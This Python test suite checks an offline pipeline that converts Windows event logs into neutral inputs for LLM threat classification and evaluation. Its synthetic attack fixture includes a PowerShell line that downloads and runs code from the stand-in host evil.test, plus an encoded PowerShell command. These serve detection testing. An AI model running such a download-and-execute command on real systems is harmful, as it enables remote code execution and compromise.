"""
Offline test suite for the supplementary OTRF external-validation pipeline.

These tests run WITHOUT Ollama, without network access, and without touching
the frozen 120-scenario primary experiment. They exercise the shared modules
(otrf_common, otrf_adapter) and the four pipeline scripts via importlib with
path constants redirected to a temporary directory.

Run from the repository root or from external_validation/tests/:
    python -m pytest external_validation/tests/ -v
or, if pytest is unavailable, the file is also runnable directly:
    python external_validation/tests/test_otrf_external.py
"""
from __future__ import annotations

import gzip
import importlib.util
import json
import sys
from pathlib import Path

# --------------------------------------------------------------------------- #
# Locate the scripts/runs directory and import the shared modules             #
# --------------------------------------------------------------------------- #
THIS = Path(__file__).resolve()
RUNS_DIR = THIS.parents[2] / "scripts" / "runs_otrf"
REPO_ROOT = THIS.parents[2]
sys.path.insert(0, str(RUNS_DIR))

import otrf_common as oc          # noqa: E402
import otrf_adapter as oa         # noqa: E402


def load_script(filename: str):
    """Import a numbered pipeline script (invalid module name) by path."""
    path = RUNS_DIR / filename
    mod_name = filename.replace("-", "_").replace(".py", "")
    spec = importlib.util.spec_from_file_location(mod_name, path)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


# --------------------------------------------------------------------------- #
# Fixtures: synthetic OTRF-like source events                                 #
# --------------------------------------------------------------------------- #
ABNORMAL_EVENTS = [
    {"EventID": 4625, "Channel": "Security", "TargetUserName": "admin", "IpAddress": "10.0.0.5"},
    {"EventID": 4625, "Channel": "Security", "TargetUserName": "admin", "IpAddress": "10.0.0.5"},
    {"EventID": 4625, "Channel": "Security", "TargetUserName": "admin", "IpAddress": "10.0.0.5"},
    {"EventID": 4624, "Channel": "Security", "TargetUserName": "admin"},
    {"EventID": 1, "Channel": "Microsoft-Windows-Sysmon/Operational",
     "Image": "C:\\Windows\\System32\\powershell.exe",
     "CommandLine": "powershell -enc SQBFAFgA"},
    {"EventID": 4104, "Channel": "Microsoft-Windows-PowerShell/Operational",
     "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://evil.test/x')"},
    {"EventID": 5001, "Channel": "Microsoft-Windows-Windows Defender/Operational"},
    {"EventID": 4698, "Channel": "Security", "TaskName": "\\Updater"},
]
BENIGN_EVENTS = [
    {"EventID": 4624, "Channel": "Security", "TargetUserName": "alice"},
    {"EventID": 4688, "Channel": "Security", "NewProcessName": "C:\\Program Files\\Notepad\\notepad.exe"},
]


def write_jsonl(path: Path, events: list[dict]) -> Path:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text("\n".join(json.dumps(e) for e in events), encoding="utf-8")
    return path


def write_json_array(path: Path, events: list[dict]) -> Path:
    path.write_text(json.dumps(events), encoding="utf-8")
    return path


# --------------------------------------------------------------------------- #
# 1. Hashing is deterministic and reproducible                                #
# --------------------------------------------------------------------------- #
def test_sha256_text_reproducible():
    a = oc.sha256_text("endpoint behaviour summary")
    b = oc.sha256_text("endpoint behaviour summary")
    assert a == b
    assert a != oc.sha256_text("endpoint behaviour summary ")
    assert len(a) == 64


def test_sha256_file_reproducible(tmp_path):
    f = tmp_path / "x.json"
    f.write_text('{"a":1}', encoding="utf-8")
    assert oc.sha256_file(f) == oc.sha256_file(f)


# --------------------------------------------------------------------------- #
# 2. Adapter: leak-field removal and OTRF-label exclusion                     #
# --------------------------------------------------------------------------- #
def test_neutral_input_has_no_leak_fields(tmp_path):
    src = write_jsonl(tmp_path / "abn.jsonl", ABNORMAL_EVENTS)
    adapted = oa.adapt_source_file(src, max_events=5000)
    ni = adapted["neutral_input"]
    leaks = oa.assert_no_leakage(ni)
    assert leaks == [], f"leakage detected: {leaks}"
    # No raw IP, command line, script text, or filename anywhere in the input
    blob = json.dumps(ni).lower()
    for forbidden in ["10.0.0.5", "downloadstring", "evil.test",
                      "sqbfafga", "\\updater", "commandline", "notepad.exe"]:
        assert forbidden.lower() not in blob, f"leaked: {forbidden}"


def test_otrf_label_never_in_neutral_input(tmp_path):
    src = write_jsonl(tmp_path / "abn.jsonl", ABNORMAL_EVENTS)
    adapted = oa.adapt_source_file(src, max_events=5000)
    blob = json.dumps(adapted["neutral_input"]).lower()
    # The manifest label (attack / benign / technique) must not appear
    for forbidden in ["attack", "benign", "malicious", "t1110", "t1562", "adversary"]:
        assert forbidden not in blob, f"answer-key term leaked into input: {forbidden}"


def test_missing_fields_not_invented(tmp_path):
    # Benign file with Security-channel telemetry only (no Defender/Firewall
    # channel at all) -> fields whose channel was NEVER captured must be the
    # "not_available" sentinel, never asserted false/0. Fields whose channel
    # (Security) WAS captured but showed nothing are legitimately false/0.
    src = write_json_array(tmp_path / "ben.json", BENIGN_EVENTS)
    adapted = oa.adapt_source_file(src, max_events=5000)
    es = adapted["neutral_input"]["event_summary"]
    assert es["defender_disabled"] == "not_available"      # Defender channel absent
    assert es["failed_logins"] == 0                        # Security channel present, quiet
    assert es["usb_connection_count"] == 0                 # Security channel present, quiet
    assert es["risky_processes"] == []
    assert es["network_profile"] == "not_available"


def test_telemetry_not_available_when_channel_absent(tmp_path):
    # A file with ONLY Sysmon process-creation telemetry never captures
    # Defender/Firewall/authentication/USB channels at all.
    events = [{"EventID": 1, "Channel": "Microsoft-Windows-Sysmon/Operational",
               "Image": "C:\\Windows\\System32\\notepad.exe"}]
    src = write_jsonl(tmp_path / "sysmon_only.jsonl", events)
    es = oa.adapt_source_file(src, max_events=5000)["neutral_input"]["event_summary"]
    assert es["defender_disabled"] == "not_available"
    assert es["firewall_changed"] == "not_available"
    assert es["failed_logins"] == "not_available"
    assert es["failed_login_activity"] == "not_available"
    assert es["failed_login_count_band"] == "not_available"


def test_telemetry_false_when_channel_present_but_quiet(tmp_path):
    # Defender channel IS present (a routine, non-disabling event) alongside a
    # supported login event -> defender_disabled must be False, not
    # "not_available", because the channel was genuinely captured.
    events = [
        {"EventID": 4624, "Channel": "Security", "TargetUserName": "alice"},
        {"EventID": 1001, "Channel": "Microsoft-Windows-Windows Defender/Operational"},
    ]
    src = write_jsonl(tmp_path / "quiet_defender.jsonl", events)
    es = oa.adapt_source_file(src, max_events=5000)["neutral_input"]["event_summary"]
    assert es["defender_disabled"] is False
    assert es["defender_config_changed"] is False
    assert es["malware_detected"] is False


# --------------------------------------------------------------------------- #
# 2b. Narrowed telemetry mappings: no more channel-wide catch-alls            #
# --------------------------------------------------------------------------- #
def test_defender_routine_event_not_treated_as_disabled(tmp_path):
    events = [
        {"EventID": 4624, "Channel": "Security", "TargetUserName": "alice"},
        {"EventID": 1001, "Channel": "Microsoft-Windows-Windows Defender/Operational"},
    ]
    src = write_jsonl(tmp_path / "x.jsonl", events)
    es = oa.adapt_source_file(src, max_events=5000)["neutral_input"]["event_summary"]
    assert es["defender_disabled"] is False


def test_malware_detection_recorded_separately_from_config_change(tmp_path):
    events = [
        {"EventID": 4624, "Channel": "Security", "TargetUserName": "alice"},
        {"EventID": 1116, "Channel": "Microsoft-Windows-Windows Defender/Operational"},
    ]
    src = write_jsonl(tmp_path / "x.jsonl", events)
    es = oa.adapt_source_file(src, max_events=5000)["neutral_input"]["event_summary"]
    assert es["malware_detected"] is True
    assert es["defender_config_changed"] is False
    assert es["defender_disabled"] is False


def test_firewall_broad_channel_no_longer_inferred(tmp_path):
    events = [
        {"EventID": 4624, "Channel": "Security", "TargetUserName": "alice"},
        {"EventID": 5157, "Channel": "Microsoft-Windows-Windows Firewall With Advanced Security"},
    ]
    src = write_jsonl(tmp_path / "x.jsonl", events)
    es = oa.adapt_source_file(src, max_events=5000)["neutral_input"]["event_summary"]
    assert es["firewall_changed"] is False  # 5157 is a connection-block log, not a config change


def test_usb_driverframeworks_broad_channel_no_longer_inferred(tmp_path):
    events = [
        {"EventID": 4624, "Channel": "Security", "TargetUserName": "alice"},
        {"EventID": 2003, "Channel": "Microsoft-Windows-DriverFrameworks-UserMode/Operational"},
    ]
    src = write_jsonl(tmp_path / "x.jsonl", events)
    es = oa.adapt_source_file(src, max_events=5000)["neutral_input"]["event_summary"]
    assert es["usb_connection_count"] == 0  # channel presence alone no longer counted


def test_powershell_engine_lifecycle_not_script_execution(tmp_path):
    events = [
        {"EventID": 4624, "Channel": "Security", "TargetUserName": "alice"},
        {"EventID": 400, "Channel": "Microsoft-Windows-PowerShell/Operational"},
    ]
    src = write_jsonl(tmp_path / "x.jsonl", events)
    es = oa.adapt_source_file(src, max_events=5000)["neutral_input"]["event_summary"]
    assert es["verified_activity_context"]["script_execution"] is False


def test_powershell_scriptblock_still_detected(tmp_path):
    events = [
        {"EventID": 4104, "Channel": "Microsoft-Windows-PowerShell/Operational",
         "ScriptBlockText": "irrelevant"},
    ]
    src = write_jsonl(tmp_path / "x.jsonl", events)
    es = oa.adapt_source_file(src, max_events=5000)["neutral_input"]["event_summary"]
    assert es["verified_activity_context"]["script_execution"] is True


def test_classic_powershell_eventid_800_detected(tmp_path):
    # Real OTRF captures overwhelmingly use the CLASSIC "Windows PowerShell"
    # log's EventID 800 ("Pipeline execution details"), not just the modern
    # Operational log's 4103/4104.
    events = [
        {"EventID": 4624, "Channel": "Security", "TargetUserName": "alice"},
        {"EventID": 800, "Channel": "Windows PowerShell"},
    ]
    src = write_jsonl(tmp_path / "x.jsonl", events)
    es = oa.adapt_source_file(src, max_events=5000)["neutral_input"]["event_summary"]
    assert es["verified_activity_context"]["script_execution"] is True


def test_eventid_800_outside_powershell_channel_not_matched(tmp_path):
    # EventID 800 from an unrelated provider must not be treated as script
    # execution, AND must not fabricate PowerShell/Sysmon channel availability
    # -- since no such channel was actually present, the field is the
    # "not_available" sentinel, not a false positive False.
    events = [
        {"EventID": 4624, "Channel": "Security", "TargetUserName": "alice"},
        {"EventID": 800, "Channel": "SomeOtherProvider"},
    ]
    src = write_jsonl(tmp_path / "x.jsonl", events)
    es = oa.adapt_source_file(src, max_events=5000)["neutral_input"]["event_summary"]
    assert es["verified_activity_context"]["script_execution"] == "not_available"


def test_lsass_targeted_process_access_detected(tmp_path):
    events = [
        {"EventID": 10, "Channel": "Microsoft-Windows-Sysmon/Operational",
         "TargetImage": "C:/Windows/System32/lsass.exe", "SourceImage": "C:/tools/procdump.exe"},
    ]
    src = write_jsonl(tmp_path / "x.jsonl", events)
    es = oa.adapt_source_file(src, max_events=5000)["neutral_input"]["event_summary"]
    assert es["verified_activity_context"]["lsass_access_detected"] is True


def test_non_lsass_process_access_not_flagged(tmp_path):
    # ProcessAccess against an unrelated target must NOT be flagged: the
    # (very common, mostly benign) event ID alone does not support the
    # conclusion, only TargetImage == lsass.exe does.
    events = [
        {"EventID": 10, "Channel": "Microsoft-Windows-Sysmon/Operational",
         "TargetImage": "C:/Windows/System32/notepad.exe", "SourceImage": "C:/tools/explorer.exe"},
        {"EventID": 4624, "Channel": "Security", "TargetUserName": "alice"},
    ]
    src = write_jsonl(tmp_path / "x.jsonl", events)
    es = oa.adapt_source_file(src, max_events=5000)["neutral_input"]["event_summary"]
    assert es["verified_activity_context"]["lsass_access_detected"] is False


# --------------------------------------------------------------------------- #
# 2c. Malformed / empty / zero-supported-event rejection                      #
# --------------------------------------------------------------------------- #
def test_malformed_jsonl_lines_recorded(tmp_path):
    text = ('{"EventID": 4624, "Channel": "Security"}\n'
            'not valid json at all\n'
            '{"EventID": 4625, "Channel": "Security"}\n')
    src = tmp_path / "mixed.jsonl"
    src.write_text(text, encoding="utf-8")
    adapted = oa.adapt_source_file(src, max_events=5000)
    assert adapted["malformed_line_count"] == 1
    assert adapted["event_count_total"] == 2


def test_completely_invalid_jsonl_rejected(tmp_path):
    src = tmp_path / "garbage.jsonl"
    src.write_text("this is not json\nneither is this\n{{{broken", encoding="utf-8")
    try:
        oa.adapt_source_file(src, max_events=5000)
        assert False, "expected EmptyDatasetError"
    except oa.EmptyDatasetError:
        pass


def test_zero_valid_events_rejected(tmp_path):
    src = tmp_path / "empty.jsonl"
    src.write_text("\n\n   \n", encoding="utf-8")
    try:
        oa.adapt_source_file(src, max_events=5000)
        assert False, "expected EmptyDatasetError"
    except oa.EmptyDatasetError:
        pass


def test_zero_supported_events_rejected(tmp_path):
    events = [{"EventID": 9999, "Channel": "SomeCompletelyUnknownChannel"}]
    src = write_jsonl(tmp_path / "unsupported.jsonl", events)
    try:
        oa.adapt_source_file(src, max_events=5000)
        assert False, "expected UnsupportedTelemetryError"
    except oa.UnsupportedTelemetryError:
        pass


def test_evidence_extracted_from_abnormal(tmp_path):
    src = write_jsonl(tmp_path / "abn.jsonl", ABNORMAL_EVENTS)
    es = oa.adapt_source_file(src, max_events=5000)["neutral_input"]["event_summary"]
    assert es["failed_logins"] == 3
    assert es["defender_disabled"] is True
    assert es["scheduled_task_change"] is True
    assert es["verified_activity_context"]["script_execution"] is True


# --------------------------------------------------------------------------- #
# 3. Adapter: format support / unsupported format fails cleanly               #
# --------------------------------------------------------------------------- #
def test_unsupported_format_raises(tmp_path):
    bad = tmp_path / "bad.txt"
    bad.write_text("not json", encoding="utf-8")
    try:
        oa.adapt_source_file(bad, max_events=5000)
        assert False, "expected UnsupportedFormatError"
    except oa.UnsupportedFormatError:
        pass


def test_zip_ignores_macosx_resource_fork_entry(tmp_path):
    # Real-world case: a published OTRF zip contained a genuine JSON member
    # PLUS a macOS AppleDouble resource-fork junk entry
    # (__MACOSX/._name.json). That must not be counted as a second real
    # member and must not cause a false "found 2 members" rejection.
    import zipfile
    zpath = tmp_path / "abn.zip"
    with zipfile.ZipFile(zpath, "w") as zf:
        zf.writestr("abn.json", "\n".join(json.dumps(e) for e in ABNORMAL_EVENTS))
        zf.writestr("__MACOSX/._abn.json", b"\x00\x05\x16\x07\x00\x02")  # junk, not JSON
    es = oa.adapt_source_file(zpath, max_events=5000)["neutral_input"]["event_summary"]
    assert es["failed_logins"] == 3


def test_gzip_supported(tmp_path):
    raw = tmp_path / "abn.jsonl"
    write_jsonl(raw, ABNORMAL_EVENTS)
    gz = tmp_path / "abn.jsonl.gz"
    with gzip.open(gz, "wt", encoding="utf-8") as fh:
        fh.write(raw.read_text(encoding="utf-8"))
    es = oa.adapt_source_file(gz, max_events=5000)["neutral_input"]["event_summary"]
    assert es["failed_logins"] == 3


def test_window_cap_is_deterministic(tmp_path):
    many = [{"EventID": 4625, "Channel": "Security"} for _ in range(50)]
    src = write_jsonl(tmp_path / "many.jsonl", many)
    a = oa.adapt_source_file(src, max_events=10)
    b = oa.adapt_source_file(src, max_events=10)
    assert a["event_count_window"] == b["event_count_window"] == 10
    assert a["neutral_input"] == b["neutral_input"]


# --------------------------------------------------------------------------- #
# 4. Indicator matching: exact canonical only, no substring, OOV retained     #
# --------------------------------------------------------------------------- #
def test_exact_canonical_match():
    vocab = {"failed_login", "defender_disabled"}
    out = oc.classify_indicators(["failed_login", "defender_disabled"], vocab)
    assert set(out["canonical"]) == {"failed_login", "defender_disabled"}
    assert out["out_of_vocabulary"] == []


def test_substring_gets_no_credit():
    vocab = {"failed_login"}
    # "failed" is a substring of the token but must NOT be credited
    out = oc.classify_indicators(["failed", "login_failed_many"], vocab)
    assert out["canonical"] == []
    assert "failed" in out["out_of_vocabulary"]


def test_out_of_vocabulary_retained():
    vocab = {"failed_login"}
    out = oc.classify_indicators(["failed_login", "totally_made_up"], vocab)
    assert out["canonical"] == ["failed_login"]
    assert out["out_of_vocabulary"] == ["totally_made_up"]


def test_canonicalise_surface_only():
    # Corrected 2026-07-19 exact-match rule: case-fold + trim OUTER whitespace
    # ONLY. Spaces and hyphens are NOT folded to underscores; inner punctuation
    # is not stripped; synonyms are never mapped.
    assert oc.canonicalise_indicator("Failed_Login") == "failed_login"       # case-fold only
    assert oc.canonicalise_indicator("  DEFENDER_disabled ") == "defender_disabled"  # outer trim + fold
    # space / hyphen variants must NOT collapse to the underscored token
    assert oc.canonicalise_indicator("failed login") == "failed login"
    assert oc.canonicalise_indicator("failed-login") == "failed-login"
    assert oc.canonicalise_indicator("failed login") != "failed_login"
    assert oc.canonicalise_indicator("failed-login") != "failed_login"


def test_space_and_hyphen_variants_are_out_of_vocabulary():
    # The exact rule means only the verbatim underscored token earns credit;
    # space/hyphen phrasings of the same concept are retained as OOV, not folded.
    vocab = {"failed_login"}
    out = oc.classify_indicators(["failed login", "failed-login", "failed_login"], vocab)
    assert out["canonical"] == ["failed_login"]
    assert "failed login" in out["out_of_vocabulary"]
    assert "failed-login" in out["out_of_vocabulary"]


# --------------------------------------------------------------------------- #
# 5. Validity: parse != strict; placeholder echoes fail; risk/keys checked    #
# --------------------------------------------------------------------------- #
def test_parse_valid_but_not_strict():
    parsed = {"classification": "banana", "risk_level": "high", "indicators": []}
    v = oc.validate_response(parsed)
    assert v["json_parse_valid"] is True
    assert v["required_keys_valid"] is True
    assert v["classification_valid"] is False   # 'banana' not a valid class
    assert v["strict_schema_valid"] is False


def test_placeholder_echo_fails_strict():
    parsed = {"classification": "normal or risky",
              "risk_level": "low, medium, high, or critical",
              "indicators": ["indicator_1", "indicator_2"]}
    v = oc.validate_response(parsed)
    assert v["classification_valid"] is False
    assert v["risk_valid"] is False
    assert v["strict_schema_valid"] is False


def test_basic_vs_strict_schema():
    parsed = {"classification": "abnormal", "risk_level": "high",
              "indicators": ["failed_login"]}
    assert oc.is_schema_valid(parsed) is True
    assert oc.validate_response(parsed)["strict_schema_valid"] is True
    assert oc.is_schema_valid(None) is False


def test_normalise_class_maps_synonyms():
    assert oc.normalise_class("risky") == "abnormal"
    assert oc.normalise_class("malicious") == "abnormal"
    assert oc.normalise_class("benign") == "normal"


# --------------------------------------------------------------------------- #
# 6. Prompt construction: RAG prompt == baseline plus a reference block       #
# --------------------------------------------------------------------------- #
def test_rag_prompt_is_baseline_plus_context():
    ni = {"context_state": {}, "event_summary": {"failed_logins": 3}}
    base = oc.build_baseline_prompt(ni)
    # build_rag_prompt takes retrieval records shaped {"doc": <kb doc>, ...}
    fake_docs = [
        {"doc": {"title": "AUTH reference", "full_text": "Reference doc body one."},
         "score": 10, "rank": 1},
        {"doc": {"title": "SEC reference", "full_text": "Reference doc body two."},
         "score": 8, "rank": 2},
    ]
    rag = oc.build_rag_prompt(ni, fake_docs)
    # The scenario payload and schema must be present in both
    assert "failed_logins" in base and "failed_logins" in rag
    # RAG adds a reference block; it is strictly longer than the baseline
    assert len(rag) > len(base)
    assert "Reference guidance" in rag
    assert "Reference doc body one." in rag


# --------------------------------------------------------------------------- #
# 7. Retrieval is deterministic and excludes GLOBAL                           #
# --------------------------------------------------------------------------- #
def test_retrieval_deterministic():
    kb = oc.load_knowledge_base()
    assert len(kb) > 0
    ni = {"context_state": {},
          "event_summary": {"failed_logins": 12, "failed_login_activity": True,
                            "defender_disabled": True}}
    feats = oc.build_query_features(ni)
    r1 = oc.retrieve(feats, kb, top_k=3)
    r2 = oc.retrieve(feats, kb, top_k=3)
    ids1 = [d["doc"]["doc_id"] for d in r1]
    ids2 = [d["doc"]["doc_id"] for d in r2]
    assert ids1 == ids2
    # GLOBAL docs are excluded from the active index
    assert all("GLOBAL" not in d["doc"]["doc_id"].upper() for d in r1)


def test_query_features_use_active_evidence_only():
    ni = {"context_state": {"network_profile": "public"},
          "event_summary": {"failed_logins": 0, "failed_login_activity": False}}
    feats = oc.build_query_features(ni)
    # No failed-login evidence present -> should not be a query feature
    flat = " ".join(feats.get("fields", []) + feats.get("values", []))
    assert "failed_login_activity" not in feats.get("fields", []) or \
        "failed_logins" not in flat


# --------------------------------------------------------------------------- #
# 8. Statistics: bootstrap seeded reproducibility, exact McNemar, Holm        #
# --------------------------------------------------------------------------- #
def test_bootstrap_ci_reproducible():
    vals = [1.0, 1.0, 0.0, 1.0, 0.0, 1.0]
    a = oc.mean_ci_bootstrap(vals, iters=2000, seed=2026)
    b = oc.mean_ci_bootstrap(vals, iters=2000, seed=2026)
    assert a == b


def test_proportion_ci_not_estimable_when_empty():
    r = oc.proportion_ci_bootstrap(0, 0)
    assert r["estimable"] is False


def test_exact_mcnemar_discordant_counts():
    base = {"s1": True, "s2": False, "s3": True}
    rag = {"s1": True, "s2": True, "s3": False}
    mc = oc.exact_mcnemar(base, rag)
    assert mc["both_correct"] == 1        # s1
    assert mc["rag_only_correct"] == 1    # s2
    assert mc["baseline_only_correct"] == 1  # s3
    assert mc["discordant"] == 2


def test_fmt_p_never_zero():
    assert oc.fmt_p(0.0) != "0.000"
    assert "<" in oc.fmt_p(0.0)


# --------------------------------------------------------------------------- #
# 9. Runners never read the external answer key                               #
# --------------------------------------------------------------------------- #
def test_runners_do_not_read_ground_truth():
    for fname in ["9-run-otrf-baseline.py", "10-run-otrf-rag.py"]:
        text = (RUNS_DIR / fname).read_text(encoding="utf-8")
        assert "external_ground_truth" not in text.lower()
        assert "EXTERNAL_GROUND_TRUTH_PATH" not in text


def test_only_evaluator_reads_ground_truth():
    text = (RUNS_DIR / "11-evaluate-otrf-external.py").read_text(encoding="utf-8")
    assert "answer_key" in text or "EXTERNAL_GROUND_TRUTH_PATH" in text


# --------------------------------------------------------------------------- #
# 10. Path portability: no OS-specific absolute paths in the new code         #
# --------------------------------------------------------------------------- #
def test_no_hardcoded_absolute_paths():
    for fname in ["otrf_common.py", "otrf_adapter.py",
                  "8-prepare-otrf-external.py", "8-freeze-otrf-retrieval-plan.py",
                  "9-run-otrf-baseline.py", "10-run-otrf-rag.py",
                  "11-evaluate-otrf-external.py"]:
        text = (RUNS_DIR / fname).read_text(encoding="utf-8")
        assert "/home/claude" not in text, f"{fname} has a machine-specific path"
        assert "C:\\Users" not in text, f"{fname} has a Windows-specific path"


def test_paths_derive_from_repo_root():
    # ROOT_DIR resolves to the repo root two levels above scripts/runs
    assert oc.ROOT_DIR == REPO_ROOT
    assert oc.EXTERNAL_DIR == REPO_ROOT / "external_validation"


# --------------------------------------------------------------------------- #
# 11. Primary frozen experiment is never referenced for writing              #
# --------------------------------------------------------------------------- #
def test_new_code_does_not_write_primary_outputs():
    for fname in ["otrf_common.py", "otrf_adapter.py",
                  "8-prepare-otrf-external.py", "8-freeze-otrf-retrieval-plan.py",
                  "9-run-otrf-baseline.py", "10-run-otrf-rag.py",
                  "11-evaluate-otrf-external.py"]:
        text = (RUNS_DIR / fname).read_text(encoding="utf-8")
        # No writes into the frozen primary output trees
        for frozen in ["outputs_consistency", "ground_truth_FINAL"]:
            # reading is fine only for vocab; these frozen dirs must not appear
            assert frozen not in text, f"{fname} references frozen primary artefact {frozen}"


# --------------------------------------------------------------------------- #
# 12. completed_ids supports resume without repeats                           #
# --------------------------------------------------------------------------- #
def test_completed_ids_resume(tmp_path):
    raw = tmp_path / "m_baseline_raw.jsonl"
    oc.append_jsonl(raw, {"external_scenario_id": "EXT_001"})
    oc.append_jsonl(raw, {"external_scenario_id": "EXT_002"})
    done = oc.completed_ids(raw)
    assert done == {"EXT_001", "EXT_002"}


# --------------------------------------------------------------------------- #
# 13. Overwrite / resume protection (network-free: triggers the early-exit    #
# and all-skipped paths in run_model_over_scenarios before any model call)    #
# --------------------------------------------------------------------------- #
def test_overwrite_protection_raises_without_flags(tmp_path):
    raw_dir = tmp_path / "outputs_baseline"
    model_dir = raw_dir / oc.safe_model_dir("llama3")
    model_dir.mkdir(parents=True)
    raw_path = model_dir / f"{oc.safe_model_dir('llama3')}_baseline_raw.jsonl"
    oc.append_jsonl(raw_path, {"external_scenario_id": "EXT_001"})
    scenarios = [("EXT_001", {"context_state": {}, "event_summary": {}})]
    try:
        oc.run_model_over_scenarios("llama3", scenarios, lambda i, n: ("p", {}),
                                    "baseline", raw_dir, resume=False, overwrite=False)
        assert False, "expected SystemExit (existing outputs, no --resume/--overwrite)"
    except SystemExit as exc:
        assert "resume" in str(exc).lower() or "overwrite" in str(exc).lower()


def test_resume_skips_all_completed_without_model_calls(tmp_path):
    raw_dir = tmp_path / "outputs_baseline"
    model_dir = raw_dir / oc.safe_model_dir("llama3")
    model_dir.mkdir(parents=True)
    raw_path = model_dir / f"{oc.safe_model_dir('llama3')}_baseline_raw.jsonl"
    oc.append_jsonl(raw_path, {"external_scenario_id": "EXT_001"})
    scenarios = [("EXT_001", {"context_state": {}, "event_summary": {}})]

    def _boom(*a, **k):
        raise AssertionError("call_model must not be invoked when every scenario is already resumed")

    original_call_model = oc.call_model
    oc.call_model = _boom
    try:
        result = oc.run_model_over_scenarios("llama3", scenarios, lambda i, n: ("p", {}),
                                             "baseline", raw_dir, resume=True, overwrite=False,
                                             cycle=False)
    finally:
        oc.call_model = original_call_model
    assert result["skipped_existing"] == 1
    assert result["written"] == 0


# --------------------------------------------------------------------------- #
# 14. Source-path resolution: relative to external_validation/source/,       #
# absolute paths used as-is, NOT relative to the repository root             #
# --------------------------------------------------------------------------- #
def test_resolve_source_path_relative_uses_source_dir(tmp_path):
    p = oc.resolve_source_path("EXT_001/file.jsonl", source_dir=tmp_path)
    assert p == tmp_path / "EXT_001" / "file.jsonl"


def test_resolve_source_path_absolute_used_as_is(tmp_path):
    abs_path = tmp_path / "somewhere" / "file.jsonl"
    p = oc.resolve_source_path(str(abs_path), source_dir=tmp_path / "unrelated")
    assert p == abs_path


def test_resolve_source_path_defaults_to_module_source_dir():
    p = oc.resolve_source_path("EXT_001/file.jsonl")
    assert p == oc.SOURCE_DIR / "EXT_001" / "file.jsonl"
    # Never silently relative to the repository root.
    assert p != oc.ROOT_DIR / "EXT_001" / "file.jsonl" or oc.SOURCE_DIR == oc.ROOT_DIR


# --------------------------------------------------------------------------- #
# 15. SHA-256 integrity enforcement (fail-by-default)                        #
# --------------------------------------------------------------------------- #
def test_manifest_hash_drift_detected(tmp_path):
    src = tmp_path / "EXT_001.jsonl"
    write_jsonl(src, ABNORMAL_EVENTS)
    neutral_dir = tmp_path / "neutral_inputs"
    neutral_dir.mkdir()
    neutral_text = json.dumps({"a": 1})
    (neutral_dir / "EXT_001.json").write_text(neutral_text, encoding="utf-8")

    row = {"external_scenario_id": "EXT_001", "source_path": str(src),
           "source_hash": oc.sha256_file(src), "neutral_input_hash": oc.sha256_text(neutral_text)}

    original_neutral_dir = oc.NEUTRAL_INPUTS_DIR
    oc.NEUTRAL_INPUTS_DIR = neutral_dir
    try:
        clean = oc.verify_manifest_integrity([row])
        assert clean == []
        # Mutate the source file after "freezing" -> must be detected as drift.
        src.write_text(src.read_text(encoding="utf-8") + '\n{"EventID": 9999}', encoding="utf-8")
        drifted = oc.verify_manifest_integrity([row])
        assert any("source" in v for v in drifted)
    finally:
        oc.NEUTRAL_INPUTS_DIR = original_neutral_dir


def test_neutral_input_hash_drift_detected(tmp_path):
    src = tmp_path / "EXT_001.jsonl"
    write_jsonl(src, ABNORMAL_EVENTS)
    neutral_dir = tmp_path / "neutral_inputs"
    neutral_dir.mkdir()
    neutral_path = neutral_dir / "EXT_001.json"
    neutral_path.write_text(json.dumps({"a": 1}), encoding="utf-8")

    row = {"external_scenario_id": "EXT_001", "source_path": str(src),
           "source_hash": oc.sha256_file(src),
           "neutral_input_hash": oc.sha256_text(neutral_path.read_text(encoding="utf-8"))}

    original_neutral_dir = oc.NEUTRAL_INPUTS_DIR
    oc.NEUTRAL_INPUTS_DIR = neutral_dir
    try:
        assert oc.verify_manifest_integrity([row]) == []
        neutral_path.write_text(json.dumps({"a": 2}), encoding="utf-8")  # drift
        drifted = oc.verify_manifest_integrity([row])
        assert any("neutral input hash drift" in v for v in drifted)
    finally:
        oc.NEUTRAL_INPUTS_DIR = original_neutral_dir


def test_knowledge_base_hash_drift_detected():
    kb = oc.load_knowledge_base()
    kb_concat = "".join(sorted(d["full_text"] for d in kb))
    correct_hash = oc.sha256_text(kb_concat)
    meta_clean = {"kb_documents_hash": correct_hash, "neutral_inputs_hash": "irrelevant"}
    meta_drifted = {"kb_documents_hash": "0" * 64, "neutral_inputs_hash": "irrelevant"}
    assert oc.verify_retrieval_plan_integrity(meta_clean, kb, []) == \
        [v for v in oc.verify_retrieval_plan_integrity(meta_clean, kb, []) if "neutral" in v]
    violations = oc.verify_retrieval_plan_integrity(meta_drifted, kb, [])
    assert any("knowledge-base" in v for v in violations)


def test_retrieval_plan_neutral_inputs_hash_drift_detected(tmp_path):
    f = tmp_path / "EXT_001.json"
    f.write_text(json.dumps({"a": 1}), encoding="utf-8")
    correct_hash = oc.sha256_text(f.read_text(encoding="utf-8"))
    kb = oc.load_knowledge_base()
    kb_concat = "".join(sorted(d["full_text"] for d in kb))
    meta_clean = {"kb_documents_hash": oc.sha256_text(kb_concat), "neutral_inputs_hash": correct_hash}
    assert oc.verify_retrieval_plan_integrity(meta_clean, kb, [f]) == []
    f.write_text(json.dumps({"a": 2}), encoding="utf-8")  # drift after freeze
    violations = oc.verify_retrieval_plan_integrity(meta_clean, kb, [f])
    assert any("neutral inputs changed" in v for v in violations)


def test_missing_retrieved_kb_document_detected():
    kb_by_id = {"AUTH_001": {"title": "x"}}
    entry = {"documents": [{"document_id": "AUTH_001"}, {"document_id": "DOES_NOT_EXIST"}]}
    import importlib.util as _ilu  # local import to avoid polluting module namespace
    rag_mod = load_script("10-run-otrf-rag.py")
    missing = rag_mod.missing_plan_documents(entry, kb_by_id)
    assert missing == ["DOES_NOT_EXIST"]


def test_require_no_violations_fails_by_default():
    try:
        oc.require_no_violations(["something drifted"], "test context", allow_override=False)
        assert False, "expected IntegrityError"
    except oc.IntegrityError:
        pass


def test_require_no_violations_allows_explicit_override():
    oc.require_no_violations(["something drifted"], "test context", allow_override=True)  # must not raise


def test_retrieval_divergence_is_documented():
    assert "not_available" in oc._INACTIVE_STRINGS
    assert len(oc.RETRIEVAL_DIFFERENCES_FROM_PRIMARY) >= 1
    assert any("not_available" in d for d in oc.RETRIEVAL_DIFFERENCES_FROM_PRIMARY)
    assert oc.RETRIEVAL_IMPLEMENTATION_VERSION


# --------------------------------------------------------------------------- #
# 16. Runners load ONLY the frozen manifest's scenario ids, never a           #
# directory listing of neutral_inputs/                                       #
